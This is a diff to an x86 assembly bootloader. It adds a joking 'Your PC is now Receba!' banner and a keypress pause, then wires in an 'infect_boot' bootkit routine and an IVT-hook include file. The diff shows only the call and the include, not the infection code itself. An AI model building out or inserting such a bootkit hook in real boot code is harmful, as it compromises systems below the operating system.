@@ -56,6 +56,19 @@ load_kernel:
         mov si, kload_success
         call print_string
 
+        mov si, boot_infected
+        call print_string
+
+        mov si, msg_pause
+        call print_string
+
+        ; Blocking keyboard interrupt
+        mov ah, 0x00
+        int 0x16
+
+        ; Infecting boot (bootkit routine)
+        call infect_boot
+
         jmp KERNEL_SEGMENT:KERNEL_OFFSET
 
         ; Finishing kernel loading (Protected Mode)
@@ -87,6 +100,7 @@ begin_pm:
     jmp CODE_SEG:KERNEL_OFFSET
 
 %include "protected_mode.asm"
+%include "../bootkit/ivt_hook.asm"
 %include "../utils/print16.asm"
 
 ; Variables
@@ -95,10 +109,12 @@ bootdrive db 0
 
 ; Strings
 stg2_init      db  10, "Starting bootloader stage 2 in Real Mode at 0x7e00...", 13, 10, 0
-a20_msg        db  "Enabled Fast A20 Gate.", 13, 10, 0
-kload_init     db  "Starting kernel loading from disk...", 13, 10, 0
-kload_att_err  db  "Kernel loading error. Trying again...", 13, 10, 0
-kload_err      db  "Error while trying to load the kernel. Aborted.", 13, 10, 0
-kload_success  db  10, "Kernel loaded successfully!", 13, 10, "Transfering control...", 13, 10, 10, 10, 0
+a20_msg        db  "Fast A20 Gate enabled.", 13, 10, 0
+kload_init     db  "Loading kernel from disk...", 13, 10, 0
+kload_att_err  db  "Kernel loading failed. Retrying...", 13, 10, 10, 0
+kload_err      db  "Fatal error: Could not load kernel. System halted.", 13, 10, 10, 0
+kload_success  db  "Kernel loaded successfully!", 13, 10, 10, 0
+boot_infected  db  "Your PC is now Receba!", 13, 10, "Aqui e o melhor do mundo, gracas a Deus!", 13, 10, 10, 0
+msg_pause      db  "Press any key to continue...", 13, 10, 10, 0
 
 times 4096 - ($ - $$) db 0
